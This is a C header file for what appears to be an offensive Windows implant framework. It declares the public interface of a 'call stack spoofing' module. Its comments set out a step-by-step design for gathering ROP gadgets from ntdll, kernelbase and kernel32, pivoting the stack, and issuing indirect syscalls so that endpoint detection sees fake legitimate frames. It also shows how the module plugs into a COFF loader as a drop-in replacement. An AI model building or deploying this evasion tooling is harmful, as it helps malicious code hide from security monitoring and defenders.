/*
 * BM-T2005: Call Stack Spoofing — Public API
 *
 * Fabricates synthetic stack frame chains before every sensitive NT syscall,
 * making the call stack appear to originate from legitimate Windows API code.
 *
 * Architecture:
 *   1. bm_spoof_init()      — Scan ntdll/kernel32/kernelbase for ROP gadgets,
 *                              validate against .pdata RUNTIME_FUNCTION ranges,
 *                              allocate synthetic stack
 *   2. bm_spoof_call_N()    — Same signature as sg_call_N() (drop-in replacement).
 *                              Builds spoofed frame chain, pivots RSP, executes
 *                              syscall through Stargate (primary) or direct
 *                              ntdll call (BM-T1001 fallback).
 *   3. bm_spoof_cleanup()   — Zero + free all memory
 *
 * Integration with BM-T4002 (COFF Loader):
 *   // In bm_ctx_init(), swap sg_call_ptrs to spoofed versions:
 *   if (bm_spoof_init() == 0) {
 *       ctx->sg_call_ptrs[0] = (void *)bm_spoof_call_0;
 *       ctx->sg_call_ptrs[1] = (void *)bm_spoof_call_1;
 *       // ... modules use spoofed calls transparently
 *   }
 *
 * Backends:
 *   Primary:  Stargate indirect syscall (BM-T1005) + spoofed frames
 *   Fallback: Direct ntdll call (BM-T1001) + spoofed frames
 *
 * Thread Safety:
 *   V1 uses a single global synthetic stack. Safe for single-threaded use
 *   (typical for COFF module execution). Future: TLS-based per-thread stacks.
 *
 * Platform: Windows x64 only
 */

#ifndef BM_SPOOF_H
#define BM_SPOOF_H

#include <windows.h>
#include "stargate.h"

#ifdef __cplusplus
extern "C" {
#endif

/* ========================================================================
 * Initialization
 *
 * Scans ntdll, kernel32, kernelbase for ROP gadgets:
 *   - add rsp, N; ret  (frame size gadgets, validated against .pdata)
 *   - jmp rbx           (control flow return gadget)
 * Allocates a synthetic stack region for frame chain construction.
 *
 * Requires: Stargate initialized (sg_init) OR BM-T1001 available.
 *
 * @return: 0 on success, -1 if required gadgets not found.
 * ======================================================================== */

int bm_spoof_init(void);

/* ========================================================================
 * Cleanup
 *
 * Zeros and frees the synthetic stack, gadget cache, and all internal state.
 * Safe to call on uninitialized state.
 * ======================================================================== */

void bm_spoof_cleanup(void);

/* ========================================================================
 * Spoofed Syscall Dispatch
 *
 * Drop-in replacements for sg_call_0 through sg_call_11.
 * Same signature, same return value (NTSTATUS).
 *
 * Before the syscall:
 *   1. Builds a synthetic frame chain on the pre-allocated stack
 *   2. Places stack arguments (args 5+) on the synthetic stack
 *   3. Saves real RSP, sets RBX = restore trampoline
 *   4. Pivots RSP to synthetic stack
 *   5. Loads EAX=SSN, R10/RDX/R8/R9 from args
 *   6. JMPs to syscall;ret gadget (Stargate indirect)
 *
 * After the syscall:
 *   7. ret → gadget1 (ntdll: add rsp, N; ret)
 *   8. ret → gadget2 (kernelbase: add rsp, N; ret)
 *   9. ret → gadget3 (kernel32: add rsp, N; ret)
 *  10. ret → jmp rbx → restore trampoline
 *  11. Restore real RSP, return NTSTATUS
 *
 * What the EDR sees during the syscall:
 *   Frame 0: ntdll!<func>         (add rsp gadget in RUNTIME_FUNCTION range)
 *   Frame 1: kernelbase!<func>    (add rsp gadget in RUNTIME_FUNCTION range)
 *   Frame 2: kernel32!<func>      (add rsp gadget in RUNTIME_FUNCTION range)
 * ======================================================================== */

NTSTATUS bm_spoof_call_0(SgSyscall *sc);
NTSTATUS bm_spoof_call_1(SgSyscall *sc, void *a1);
NTSTATUS bm_spoof_call_2(SgSyscall *sc, void *a1, void *a2);
NTSTATUS bm_spoof_call_3(SgSyscall *sc, void *a1, void *a2, void *a3);
NTSTATUS bm_spoof_call_4(SgSyscall *sc, void *a1, void *a2, void *a3, void *a4);
NTSTATUS bm_spoof_call_5(SgSyscall *sc, void *a1, void *a2, void *a3, void *a4,
                          void *a5);
NTSTATUS bm_spoof_call_6(SgSyscall *sc, void *a1, void *a2, void *a3, void *a4,
                          void *a5, void *a6);
NTSTATUS bm_spoof_call_7(SgSyscall *sc, void *a1, void *a2, void *a3, void *a4,
                          void *a5, void *a6, void *a7);
NTSTATUS bm_spoof_call_8(SgSyscall *sc, void *a1, void *a2, void *a3, void *a4,
                          void *a5, void *a6, void *a7, void *a8);
NTSTATUS bm_spoof_call_9(SgSyscall *sc, void *a1, void *a2, void *a3, void *a4,
                          void *a5, void *a6, void *a7, void *a8, void *a9);
NTSTATUS bm_spoof_call_10(SgSyscall *sc, void *a1, void *a2, void *a3, void *a4,
                           void *a5, void *a6, void *a7, void *a8, void *a9,
                           void *a10);
NTSTATUS bm_spoof_call_11(SgSyscall *sc, void *a1, void *a2, void *a3, void *a4,
                           void *a5, void *a6, void *a7, void *a8, void *a9,
                           void *a10, void *a11);

/* ========================================================================
 * Query: Is Spoofing Active?
 *
 * Returns non-zero if bm_spoof_init() succeeded and spoofing is available.
 * ======================================================================== */

int bm_spoof_is_active(void);

#ifdef __cplusplus
}
#endif

#endif /* BM_SPOOF_H */
